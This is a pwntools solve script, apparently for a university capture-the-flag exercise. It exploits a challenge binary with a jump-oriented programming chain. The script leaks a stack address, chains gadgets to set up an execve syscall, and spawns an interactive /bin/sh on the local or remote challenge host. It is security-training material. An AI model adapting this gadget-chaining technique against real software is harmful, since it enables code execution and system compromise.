from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b *0x4011ab
b *0x4012dd
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-jop-1.chals.io", 443, ssl=True, sni="cse4850-jop-1.chals.io")
    return process(e.path)

# Getting elements of jump table
setup_dispatch = 0x4011b5 # pop rsp; mov rdx, dispatch; jmp rdx
set_rax =        0x4011cd # mov rax, 59; jmp rdx
set_rdi =        0x4011dd # mov rdi, rbp; jmp rdx
set_rsi =        0x401201 # mov rsi, 0; jmp rdx
set_rcx =        0x4011e9 # mov rcx, rdx; jmp rdx
set_rdx =        0x4011f5 # xor rdx, rdx; jmp rcx
syscall =        0x401211 # syscall

# Creating jump table
jmp_tbl = p64(set_rax)
jmp_tbl += p64(set_rdi)
jmp_tbl += p64(set_rsi)
jmp_tbl += p64(set_rcx)
jmp_tbl += p64(set_rdx)
jmp_tbl += p64(syscall)

# Starting to remote and getting the address of the stack
p = start()
p.recvuntil(b'Stack: 0x')
stack = int(p.recv(12), 16) - 108
log.info(f"Stack identified at {hex(stack)}")

# Construct the payload
chain = b'/bin/sh\0'
chain += p64(0)
chain += jmp_tbl
chain += cyclic(48)
chain += p64(stack)
chain += p64(setup_dispatch)
chain += p64(stack)

p.sendlineafter(b'around >>>', chain)
p.interactive()